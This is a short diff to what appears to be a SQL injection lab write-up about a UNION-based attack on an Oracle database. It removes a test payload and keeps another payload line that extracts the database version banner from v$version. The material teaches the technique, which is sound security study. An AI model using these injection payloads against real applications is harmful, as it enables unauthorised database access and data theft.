@@ -12,11 +12,7 @@ Determined column count:
 
 Confirmed 2 columns.
 
-Tested output:
-
-' UNION SELECT 'test', NULL FROM dual--
-
-Extracted version:
+Extract version:
 
 ' UNION SELECT banner, NULL FROM v$version--
 
@@ -28,4 +24,4 @@ UNION queries can be used to extract data when the number of columns is known.
 
 ## Proof
 
-<img alt="result" src="success.png" />
+<img alt="result" src="1.png" />
